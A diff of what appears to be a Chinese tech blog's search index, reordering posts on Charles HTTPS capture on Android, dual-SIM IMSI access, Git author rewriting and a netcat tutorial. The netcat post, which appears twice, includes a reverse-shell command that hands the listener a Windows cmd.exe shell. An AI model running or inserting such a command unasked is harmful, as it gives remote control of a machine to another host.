@@ -108,6 +108,27 @@
       </tags>
   </entry>
   <entry>
+    <title>一个团队里的 5 种人</title>
+    <url>/2016/12/17/five-men-in-the-team/</url>
+    <content><![CDATA[<p>一个团队里，人分为 5 种<br>人渣、人员、人手、人才、人物</p>
+<p><strong>人渣</strong><br>就是牢骚抱怨，无事生非，拉帮结派，挑起事端、吃里扒外的破坏分子</p>
+<p><strong>人员</strong><br>就是只领工资不爱做事，安排与自己无关的工作不愿干，属庸人之列</p>
+<p><strong>人手</strong><br>就是安排什么做什么，不安排绝对不做，等着下命令的人</p>
+<p><strong>人才</strong><br>就是每天发自内心做事，做事有责任、有思路、有条理，知道公司的事做好了，受益的是自己，同时真心为公司操心的人</p>
+<p><strong>人物</strong><br>就是全身心投入，用灵魂去思考、做事，决心要和老板做一番事业的人</p>
+<a id="more"></a>
+
+<p>人员斤斤计较，<br>人手需要引导，<br>人才关注当下，<br>人物放眼未来！ </p>
+<p>发展靠人才，做大靠人物！</p>
+<p>通常人渣有可能鱼目混珠地苟存在大团队、大机构中，小团队里很容易一眼就看到，没法混。而人员、人手、人才是主体，人物可遇不可求</p>
+<p>任何团队都必须同心协力才能共赢发展，彼此促进，水涨船高</p>
+]]></content>
+      <tags>
+        <tag>闲聊</tag>
+        <tag>转</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>华为交换机 SNMP 协议配置</title>
     <url>/2017/02/01/huawei-switch-snmp-config/</url>
     <content><![CDATA[<p>SNMP 协议介绍：Simple Network Management 简单网络管理协议，是由 IETF 互联网工程任务组定义的一套网络管理协议。该协议基于简单网关监视协议，最初面向基于 IP 的网络管理所设计。利用 SNMP，一个管理工作站可以远程管理所有支持这种协议的网络设备，包括监视网络状态、修改网络设备配置、接收网络事件警告等</p>
@@ -131,66 +152,6 @@
 ]]></content>
       <tags>
         <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Charles 抓包 Android 端 https</title>
-    <url>/2017/02/21/charles-https/</url>
-    <content><![CDATA[<ol>
-<li><p>在阅读本文前，你应该已经会使用 Charles 进行 http 抓包。如果不会，请先掌握 http 抓包后再阅读本文</p>
-<a id="more"></a>
-</li>
-<li><p>首先需要安装 Charles 的证书到手机端<br>点击下图位置的 Save Charles Root Certificate 将会把证书文件导出，你需要选择一个导出位置<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bcb4bb8.png" alt="1.png"><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bd05e86.png" alt="2.png"></p>
-</li>
-<li><p>导出后将其移动到手机的内置存储，然后在 <strong>设置 - 安全 - 从存储设备安装</strong> 安装该证书<br>（我的手机是 Android 原生 6.0 的 ROM，个别手机的位置可能不同）<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e47c2d282.png" alt="3.png"></p>
-</li>
-<li><p>需要注意的是，在安装时弹出的提示框中 <strong>凭据用途</strong> 一项，应该选择 <strong>WLAN</strong><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e47c411e0.png" alt="4.png"></p>
-</li>
-<li><p>之后在 PC 端 Charles 的 SSL Proxying Settings 里 <strong>添加你想要抓包的链接的主机名</strong><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bd44721.png" alt="5.png"></p>
-</li>
-</ol>
-<ol start="6">
-<li>重新发起连接后，发现之前显示小锁图标的 https 请求已经可以正常抓取了<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bcc9402.png" alt="6.png"></li>
-</ol>
-<p>Ps.关于抓包中抓到的 connect 请求<br>connect 是为了建立 http tunnel 而存在的。connect 是 http 众多方法中的其中一种，它跟 post、get、put、options 方法是并列的。但是它的使用场景很特殊，只有在受限制的网络环境中（防火墙、NAT、代理器）并且是 https 通信时，客户端会使用 http connect 请求代理服务器，代理服务器使用 connect 方法与目标服务器建立 http tunnel。通道建立后，客户端与服务器进行通信，代理服务器就像透明一样，只是接收、转发 tcp stream<br>这个引用自 <a href="http://blog.csdn.net/wangjun5159/article/details/54142016" target="_blank" rel="noopener">http://blog.csdn.net/wangjun5159/article/details/54142016</a>，详细的可以查看原文</p>
-]]></content>
-      <tags>
-        <tag>Android逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一个团队里的 5 种人</title>
-    <url>/2016/12/17/five-men-in-the-team/</url>
-    <content><![CDATA[<p>一个团队里，人分为 5 种<br>人渣、人员、人手、人才、人物</p>
-<p><strong>人渣</strong><br>就是牢骚抱怨，无事生非，拉帮结派，挑起事端、吃里扒外的破坏分子</p>
-<p><strong>人员</strong><br>就是只领工资不爱做事，安排与自己无关的工作不愿干，属庸人之列</p>
-<p><strong>人手</strong><br>就是安排什么做什么，不安排绝对不做，等着下命令的人</p>
-<p><strong>人才</strong><br>就是每天发自内心做事，做事有责任、有思路、有条理，知道公司的事做好了，受益的是自己，同时真心为公司操心的人</p>
-<p><strong>人物</strong><br>就是全身心投入，用灵魂去思考、做事，决心要和老板做一番事业的人</p>
-<a id="more"></a>
-
-<p>人员斤斤计较，<br>人手需要引导，<br>人才关注当下，<br>人物放眼未来！ </p>
-<p>发展靠人才，做大靠人物！</p>
-<p>通常人渣有可能鱼目混珠地苟存在大团队、大机构中，小团队里很容易一眼就看到，没法混。而人员、人手、人才是主体，人物可遇不可求</p>
-<p>任何团队都必须同心协力才能共赢发展，彼此促进，水涨船高</p>
-]]></content>
-      <tags>
-        <tag>闲聊</tag>
-        <tag>转</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>泉城公交开发手记（一） 说明</title>
-    <url>/2018/01/07/jinan-bus-note1/</url>
-    <content><![CDATA[<p>泉城公交是我在 2015 年的时候开发的一个济南公交第三方客户端，基本实现了原生济南公交客户端的部分功能。但出于一些原因，不得不停止更新。我将所有源代码开源在了 GitHub。然后有网友邮件询问相关问题，所以，我整理了一下以前开发时的一些笔记，整理成几篇文章发出来。</p>
-<a id="more"></a>
-
-<p>这几篇文章大概分为以下几个部分<br>API 分析、通知模块实现、自定义线路图 View 等等，还有部分填坑的说明。路线规划不会写，因为这部分整个就是调用的百度离线地图 SDK。</p>
-<p>如果时间充裕的话，可能还会写一写济南公交（微步、369出行）新版的 NFC 公交卡充值实现。</p>
-<p>本系列文章仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与作者无关。</p>
-]]></content>
-      <tags>
-        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
@@ -228,6 +189,87 @@
 ]]></content>
       <tags>
         <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Charles 抓包 Android 端 https</title>
+    <url>/2017/02/21/charles-https/</url>
+    <content><![CDATA[<ol>
+<li><p>在阅读本文前，你应该已经会使用 Charles 进行 http 抓包。如果不会，请先掌握 http 抓包后再阅读本文</p>
+<a id="more"></a>
+</li>
+<li><p>首先需要安装 Charles 的证书到手机端<br>点击下图位置的 Save Charles Root Certificate 将会把证书文件导出，你需要选择一个导出位置<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bcb4bb8.png" alt="1.png"><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bd05e86.png" alt="2.png"></p>
+</li>
+<li><p>导出后将其移动到手机的内置存储，然后在 <strong>设置 - 安全 - 从存储设备安装</strong> 安装该证书<br>（我的手机是 Android 原生 6.0 的 ROM，个别手机的位置可能不同）<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e47c2d282.png" alt="3.png"></p>
+</li>
+<li><p>需要注意的是，在安装时弹出的提示框中 <strong>凭据用途</strong> 一项，应该选择 <strong>WLAN</strong><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e47c411e0.png" alt="4.png"></p>
+</li>
+<li><p>之后在 PC 端 Charles 的 SSL Proxying Settings 里 <strong>添加你想要抓包的链接的主机名</strong><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bd44721.png" alt="5.png"></p>
+</li>
+</ol>
+<ol start="6">
+<li>重新发起连接后，发现之前显示小锁图标的 https 请求已经可以正常抓取了<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bcc9402.png" alt="6.png"></li>
+</ol>
+<p>Ps.关于抓包中抓到的 connect 请求<br>connect 是为了建立 http tunnel 而存在的。connect 是 http 众多方法中的其中一种，它跟 post、get、put、options 方法是并列的。但是它的使用场景很特殊，只有在受限制的网络环境中（防火墙、NAT、代理器）并且是 https 通信时，客户端会使用 http connect 请求代理服务器，代理服务器使用 connect 方法与目标服务器建立 http tunnel。通道建立后，客户端与服务器进行通信，代理服务器就像透明一样，只是接收、转发 tcp stream<br>这个引用自 <a href="http://blog.csdn.net/wangjun5159/article/details/54142016" target="_blank" rel="noopener">http://blog.csdn.net/wangjun5159/article/details/54142016</a>，详细的可以查看原文</p>
+]]></content>
+      <tags>
+        <tag>Android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>泉城公交开发手记（一） 说明</title>
+    <url>/2018/01/07/jinan-bus-note1/</url>
+    <content><![CDATA[<p>泉城公交是我在 2015 年的时候开发的一个济南公交第三方客户端，基本实现了原生济南公交客户端的部分功能。但出于一些原因，不得不停止更新。我将所有源代码开源在了 GitHub。然后有网友邮件询问相关问题，所以，我整理了一下以前开发时的一些笔记，整理成几篇文章发出来。</p>
+<a id="more"></a>
+
+<p>这几篇文章大概分为以下几个部分<br>API 分析、通知模块实现、自定义线路图 View 等等，还有部分填坑的说明。路线规划不会写，因为这部分整个就是调用的百度离线地图 SDK。</p>
+<p>如果时间充裕的话，可能还会写一写济南公交（微步、369出行）新版的 NFC 公交卡充值实现。</p>
+<p>本系列文章仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与作者无关。</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux 下 nc 命令的简单介绍</title>
+    <url>/2017/08/16/linux-netcat/</url>
+    <content><![CDATA[<p>nc 是 Linux 下的一个强大的命令。nc 是简称，全名是 netcat。大部分的 Linux 发行版都有自带 nc 这个命令，如果没有的话就需要自己安装了</p>
+<p>我这里使用的是 CentOS 7.3，对于 nc，你可以使用 yum 安装或者自己编译二进制文件。这里推荐使用 yum 安装，因为 yum 可以自动解决依赖问题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install nmap-ncat.x86_64</span><br></pre></td></tr></table></figure>
+
+<p>同样，netcat 也有 Windows 版本可用，你可以在 <a href="https://eternallybored.org/misc/netcat" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat</a> 这里下载到 netcat 的 Windows 版本。这里下载到的是一个压缩包，里面包含 netcat 的源代码和 nc &amp; nc64 两个已经编译好的二进制文件，你可以根据自己系统来选择使用 nc 或 nc64</p>
+<a id="more"></a>
+
+<p>成功安装之后你就可以使用 nc 命令了，使用 <strong>nc –help</strong>，你可以查看到 nc 命令的详细帮助。我在这里使用几个具体的例子来简要概述下 nc 命令的基本使用方法</p>
+<h4 id="0-nc-命令的标准使用形式"><a href="#0-nc-命令的标准使用形式" class="headerlink" title="0. nc 命令的标准使用形式"></a>0. nc 命令的标准使用形式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc [-options] ip port[s] [ports]</span><br></pre></td></tr></table></figure>
+
+<p>ip 处是可以使用域名的，nc 会调用 DNS 解析成 IP 地址。如果不需要 nc 自动解析的话可以在执行时添加 <strong>-n [–nodns]</strong> 参数</p>
+<h4 id="1-两台主机之间发送实时消息"><a href="#1-两台主机之间发送实时消息" class="headerlink" title="1. 两台主机之间发送实时消息"></a>1. 两台主机之间发送实时消息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A 主机：nc -lp port</span><br><span class="line">B 主机：nc ip port</span><br></pre></td></tr></table></figure>
+
+<p><strong>-l [–listen]</strong>：绑定并监听传入的连接<br><strong>-p [–source-port]</strong>：指定要使用的源端口</p>
+<p>建立连接后在任意一台主机输入信息并按下回车发送后对方就能收到<br>因为 nc 是会自动从标准流中读取数据的，如果想要禁止，可以在命令执行时使用 <strong>-d</strong> 参数</p>
+<h4 id="2-两台主机之间传送文件"><a href="#2-两台主机之间传送文件" class="headerlink" title="2. 两台主机之间传送文件"></a>2. 两台主机之间传送文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">接收端：nc -lp port &gt; outputfile</span><br><span class="line">发送端：nc destip port &lt; inputfile</span><br></pre></td></tr></table></figure>
+
+<p>这一条本质和上面那个是一样的，只是借用了输出重定向这个特性。同样，nc 命令也支持管道，你甚至可以借由此实现克隆分区：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">接收端：</span><br><span class="line">unmount /dev/sda2</span><br><span class="line">nc -lp port | dd of=/dev/sda2</span><br><span class="line"></span><br><span class="line">发送端：</span><br><span class="line">unmount /dev/sda1</span><br><span class="line">dd if=/dev/sda1 | nc destip port</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-发送-HTTP-请求"><a href="#3-发送-HTTP-请求" class="headerlink" title="3. 发送 HTTP 请求"></a>3. 发送 HTTP 请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc destip 80 &lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">GET /HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie:xxx</span><br><span class="line">xxx:xxx</span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>为什么？因为 nc 发送的是纯文本<br>保存 Web 页面？重定向输出流就好了</p>
+<h4 id="4-反向代理-Shell"><a href="#4-反向代理-Shell" class="headerlink" title="4. 反向代理 Shell"></a>4. 反向代理 Shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送端：nc -lp localport</span><br><span class="line">执行端：nc -t -e C:/windows/system32/cmd.exe destip destport</span><br></pre></td></tr></table></figure>
+
+<p><strong>-t [–telnet]</strong>：响应 telnet 交互<br><strong>-e [–exec-command]</strong>：执行给定的命令，也可以携带一个 lua 脚本</p>
+<p>destip 和 destport 即为发送端的 IP 和 localport<br>连接成功后，发送端的会得到一个执行端的 Shell</p>
+<p>你可以使用 <strong>-w</strong> 来设置无响应时的超时时间</p>
+<p>nc 在默认情况下，如果连接到 Server 的 Client 断开连接，那么 Server 也会跟着退出。你可以使用 <strong>-k</strong> 参数来保持 Server 的监听状态</p>
+<p>nc 是支持 IPV6 的，你可以使用 <strong>-4</strong> &amp; <strong>-6</strong> 参数来指定使用 IPV4 或 IPV6</p>
+<p>nc 默认是使用 TCP 协议通信，但是也支持 UDP，可添加 <strong>-u</strong> 参数来使用 UDP 协议</p>
+<blockquote>
+<p>对于使用 nc 去扫描端口这个用途，我是不推荐的，因为 nc 的扫描速度十分之慢。<br>而且，在最新的 nc 中，已经去掉了 -z &nbsp;&nbsp;&nbsp;(zero-I/O mode [used for scanning]) 这个参数。<br>所以，对于这个需求，还是使用更专业的 nmap 吧</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -513,76 +555,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux 下 nc 命令的简单介绍</title>
-    <url>/2017/08/16/linux-netcat/</url>
-    <content><![CDATA[<p>nc 是 Linux 下的一个强大的命令。nc 是简称，全名是 netcat。大部分的 Linux 发行版都有自带 nc 这个命令，如果没有的话就需要自己安装了</p>
-<p>我这里使用的是 CentOS 7.3，对于 nc，你可以使用 yum 安装或者自己编译二进制文件。这里推荐使用 yum 安装，因为 yum 可以自动解决依赖问题</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install nmap-ncat.x86_64</span><br></pre></td></tr></table></figure>
-
-<p>同样，netcat 也有 Windows 版本可用，你可以在 <a href="https://eternallybored.org/misc/netcat" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat</a> 这里下载到 netcat 的 Windows 版本。这里下载到的是一个压缩包，里面包含 netcat 的源代码和 nc &amp; nc64 两个已经编译好的二进制文件，你可以根据自己系统来选择使用 nc 或 nc64</p>
-<a id="more"></a>
-
-<p>成功安装之后你就可以使用 nc 命令了，使用 <strong>nc –help</strong>，你可以查看到 nc 命令的详细帮助。我在这里使用几个具体的例子来简要概述下 nc 命令的基本使用方法</p>
-<h4 id="0-nc-命令的标准使用形式"><a href="#0-nc-命令的标准使用形式" class="headerlink" title="0. nc 命令的标准使用形式"></a>0. nc 命令的标准使用形式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc [-options] ip port[s] [ports]</span><br></pre></td></tr></table></figure>
-
-<p>ip 处是可以使用域名的，nc 会调用 DNS 解析成 IP 地址。如果不需要 nc 自动解析的话可以在执行时添加 <strong>-n [–nodns]</strong> 参数</p>
-<h4 id="1-两台主机之间发送实时消息"><a href="#1-两台主机之间发送实时消息" class="headerlink" title="1. 两台主机之间发送实时消息"></a>1. 两台主机之间发送实时消息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A 主机：nc -lp port</span><br><span class="line">B 主机：nc ip port</span><br></pre></td></tr></table></figure>
-
-<p><strong>-l [–listen]</strong>：绑定并监听传入的连接<br><strong>-p [–source-port]</strong>：指定要使用的源端口</p>
-<p>建立连接后在任意一台主机输入信息并按下回车发送后对方就能收到<br>因为 nc 是会自动从标准流中读取数据的，如果想要禁止，可以在命令执行时使用 <strong>-d</strong> 参数</p>
-<h4 id="2-两台主机之间传送文件"><a href="#2-两台主机之间传送文件" class="headerlink" title="2. 两台主机之间传送文件"></a>2. 两台主机之间传送文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">接收端：nc -lp port &gt; outputfile</span><br><span class="line">发送端：nc destip port &lt; inputfile</span><br></pre></td></tr></table></figure>
-
-<p>这一条本质和上面那个是一样的，只是借用了输出重定向这个特性。同样，nc 命令也支持管道，你甚至可以借由此实现克隆分区：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">接收端：</span><br><span class="line">unmount /dev/sda2</span><br><span class="line">nc -lp port | dd of=/dev/sda2</span><br><span class="line"></span><br><span class="line">发送端：</span><br><span class="line">unmount /dev/sda1</span><br><span class="line">dd if=/dev/sda1 | nc destip port</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-发送-HTTP-请求"><a href="#3-发送-HTTP-请求" class="headerlink" title="3. 发送 HTTP 请求"></a>3. 发送 HTTP 请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc destip 80 &lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">GET /HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie:xxx</span><br><span class="line">xxx:xxx</span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
-
-<p>为什么？因为 nc 发送的是纯文本<br>保存 Web 页面？重定向输出流就好了</p>
-<h4 id="4-反向代理-Shell"><a href="#4-反向代理-Shell" class="headerlink" title="4. 反向代理 Shell"></a>4. 反向代理 Shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送端：nc -lp localport</span><br><span class="line">执行端：nc -t -e C:/windows/system32/cmd.exe destip destport</span><br></pre></td></tr></table></figure>
-
-<p><strong>-t [–telnet]</strong>：响应 telnet 交互<br><strong>-e [–exec-command]</strong>：执行给定的命令，也可以携带一个 lua 脚本</p>
-<p>destip 和 destport 即为发送端的 IP 和 localport<br>连接成功后，发送端的会得到一个执行端的 Shell</p>
-<p>你可以使用 <strong>-w</strong> 来设置无响应时的超时时间</p>
-<p>nc 在默认情况下，如果连接到 Server 的 Client 断开连接，那么 Server 也会跟着退出。你可以使用 <strong>-k</strong> 参数来保持 Server 的监听状态</p>
-<p>nc 是支持 IPV6 的，你可以使用 <strong>-4</strong> &amp; <strong>-6</strong> 参数来指定使用 IPV4 或 IPV6</p>
-<p>nc 默认是使用 TCP 协议通信，但是也支持 UDP，可添加 <strong>-u</strong> 参数来使用 UDP 协议</p>
-<blockquote>
-<p>对于使用 nc 去扫描端口这个用途，我是不推荐的，因为 nc 的扫描速度十分之慢。<br>而且，在最新的 nc 中，已经去掉了 -z &nbsp;&nbsp;&nbsp;(zero-I/O mode [used for scanning]) 这个参数。<br>所以，对于这个需求，还是使用更专业的 nmap 吧</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android 6.0 上的双卡相关开发</title>
-    <url>/2017/06/07/multisim-for-android-6-0/</url>
-    <content><![CDATA[<p>在 Android 5.0 以前，各芯片厂商上的双卡开发没有一个统一的标准，以至于做起双卡适配来十分麻烦。<br>Android 5.0 之后，Google 官方统一了双卡平台的适配，并在 Framework 中添加了双卡相关的 API，这对于需要处理双卡的应用来说提供了很大的便利。</p>
-<p>因为 Android 5 上的双卡 API 还不是很完善<br>所以本文是介绍在 Android 6.0 平台上的双卡相关开发<br>后续还会有一篇文章来介绍在双卡处理 Android N 上的实现</p>
-<a id="more"></a>
-
-<p>言归正题<br>在 API 层面上，自 Android 5.0 开始，加入了 SubscriptionManager。双卡相关的处理主要是依赖这个 API，你可以通过 Context 类里面的 getSystemService 方法和 SubscriptionManager.from(Context) 来取得它的对象，当然它内部也是调用的 getSystemService。</p>
-<p>在数据库方面，TelephonyProvider 的 telephony.db 中新增了 siminfo 表来管理双卡的信息<br><img src="https://ooo.0o0.ooo/2017/06/07/5937b4b154014.png" alt="1.png"></p>
-<p><img src="https://ooo.0o0.ooo/2017/06/07/5937cdcfb238e.png" alt="Screenshot_20170607-171729.png"></p>
-<p>由于字段太多，我这里只截图了几个关键的字段<br>需要注意的是 <strong>_id</strong> 和 <strong>sim_id</strong> 这两个字段<br>_id: 这个不用多说，系统要求，自增长，从 0 开始<br>sim_id：该行的卡所在的卡槽值，有 0，1，-1 三个值<br>| 数值 | 描述                        |<br>| :–: |:—————————:|<br>| 0    | 该卡插在卡槽 1 中（主卡槽） |<br>| 1    | 该卡插在卡槽 2 中（副卡槽） |<br>| -1   | 手机内曾经插入过该卡        |<br><em>Ps. 在 Android 6.0+，-1 值已经被移除</em></p>
-<p>每插入一张新的 SIM 卡，siminfo 表中就会插入一行新的数据，然后 _id 会自增长加 1</p>
-<p>详细的各个 API 可以去查阅 API 文档。我这里仅以获取双卡手机两个卡的 IMSI 为例，介绍一下各平台所使用的方法<br>SubId 这个值对于双卡相关的操作来说是必要的</p>
-<p>Android 6.0：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回当前手机所插入 SIM 卡的个数</span></span><br><span class="line">TelePhonyManager.getPhoneCount()</span><br><span class="line"></span><br><span class="line">SubscriptionManager subManager = SubscriptionManager.from(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">// 这个方法传进手机的卡槽序号，返回对应所插 SIM 卡的信息</span></span><br><span class="line">SubscriptionInfo info = subManager.getActiveSubscriptionInfoForSimSlotIndex(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> subId = info.getSubscriptionId();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该方法在 Android 6.0 中还是 @hide 状态，可以反射调用</span></span><br><span class="line">TelephonyManager teleManager = getSystemService(TelephonyManager.class);</span><br><span class="line">String imsi = teleManager.getSubscriberId(subId);</span><br></pre></td></tr></table></figure>
-
-<p>MTK：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    TelephonyManager teleManager = getSystemService(TelephonyManager.class);</span><br><span class="line">    Class&lt;?&gt; phoneClass = Class.forName(<span class="string">"com.android.internal.telephony.Phone"</span>);</span><br><span class="line"></span><br><span class="line">    Field gemni1Field = phoneClass.getField(<span class="string">"GEMINI_SIM_1"</span>);</span><br><span class="line">    Field gemni2Field = phoneClass.getField(<span class="string">"GEMINI_SIM_2"</span>);</span><br><span class="line">    gemni1Field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    gemni2Field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> simId1 = (<span class="keyword">int</span>) gemni1Field.get(<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">int</span> simId2 = (<span class="keyword">int</span>) gemni2Field.get(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    Method method = TelephonyManager.class.getDeclaredMethod(<span class="string">"getSubscriberIdGemini"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">    String imsi1 = (String) method.invoke(teleManager, simId1);</span><br><span class="line">    String imsi2 = (String) method.invoke(teleManager, simId2);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>高通：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class&lt;?&gt; msmTeleManager = Class.forName(<span class="string">"android.telephony.MSimTelephonyManager"</span>);</span><br><span class="line">    Method method = msmTeleManager.getMethod(<span class="string">"getSubscriberId"</span>, <span class="keyword">int</span>.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> simId1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> simId2 = <span class="number">1</span>;</span><br><span class="line">    Object phoneMsim = getSystemService(<span class="string">"phone_msim"</span>);</span><br><span class="line"></span><br><span class="line">    String imsi1 = (String) method.invoke(phoneMsim, simId1);</span><br><span class="line">    String imsi2 = (String) method.invoke(phoneMsim, simId2);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对比三种获取双卡 IMSI 的方式，可以看出 Android 原生支持的双卡 API 更加的规范标准。目前新出的 Android 5+ 的新机上基本都采用了原生 API，Android 的碎片化又缩小了一步</p>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>合并两个 Git 仓库</title>
     <url>/2016/11/16/merge-git-repo/</url>
     <content><![CDATA[<p>本应在 /Project 下的 Git 根目录成了 /Project/app …</p>
@@ -685,6 +657,79 @@
       </tags>
   </entry>
   <entry>
+    <title>修改 Git 已提交的用户名和邮箱</title>
+    <url>/2016/11/10/modify-git-submitted-commit/</url>
+    <content><![CDATA[<p>有些时候，可能你在 Git 提交的时候不经意间提交了错误的 Commit 作者信息，那么如何修改成正确的呢？</p>
+<p>如果尝试修改 Git 的提交邮箱</p>
+<blockquote>
+<p>git config –global user.name “Your Name”<br>git config –global user.email “Your Email”</p>
+</blockquote>
+<p>这样可以修改作者的名字和邮箱</p>
+<p>但是<br>这种方法只对之后的 Commit 有效，之前提交过的就改不了了…</p>
+<p>还好，Google 到了一种解决办法，这里分享下，也算是做个记录</p>
+<ol>
+<li><p>打开终端（Linux 的终端或 Windows 下 Git 客户端的 git-bash.exe 均可）</p>
+</li>
+<li><p>同步下来你的项目并进入目录（以 repo.git 为例）</p>
+<blockquote>
+<p>git clone –bare <a href="https://github.com/user/repo.git" target="_blank" rel="noopener">https://github.com/user/repo.git</a><br>cd repo.git</p>
+</blockquote>
+</li>
+<li><p>复制下面的脚本，可以直接复制到终端命令行里或新建 Shell 脚本<br>并修改 <strong>oldEmail</strong>, <strong>newName</strong>, <strong>newEmail</strong> 三个变量为你自己的</p>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">git filter-branch --env-filter <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">oldEmail="Your Old Email"</span></span><br><span class="line"><span class="string">newName="Your New Name"</span></span><br><span class="line"><span class="string">newEmail="Your New Email"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ "$GIT_COMMITTER_EMAIL" = "$oldEmail" ]; then</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_NAME="$newName"</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_EMAIL="$newEmail"</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ "$GIT_AUTHOR_EMAIL" = "$oldEmail" ]; then</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_NAME="$newName"</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_EMAIL="$newEmail"</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> --tag-name-filter cat -- --branches --tags</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行脚本，看到一堆 rewritten 的时候就说明写入完成了</p>
+</li>
+<li><p>git log 查看新的 Commit 信息是否正确</p>
+</li>
+<li><p>提交</p>
+<blockquote>
+<p>git push –force –tags origin ‘refs/heads/*’</p>
+</blockquote>
+</li>
+<li><p>删除临时文件</p>
+<blockquote>
+<p>cd ..<br>rm -rf repo.git</p>
+</blockquote>
+</li>
+</ol>
+<p>需要注意的是，上面的执行后，新 clone 出来的项目 Log 中 Name 和 Email 已经为最新的信息。在执行上面的几步之前已经 clone 出来的项目中，如果执行 git pull 的话，Log 中的 Name 和 Email 信息还是原来的信息</p>
+<p>这样就算是完成了</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android 6.0 上的双卡相关开发</title>
+    <url>/2017/06/07/multisim-for-android-6-0/</url>
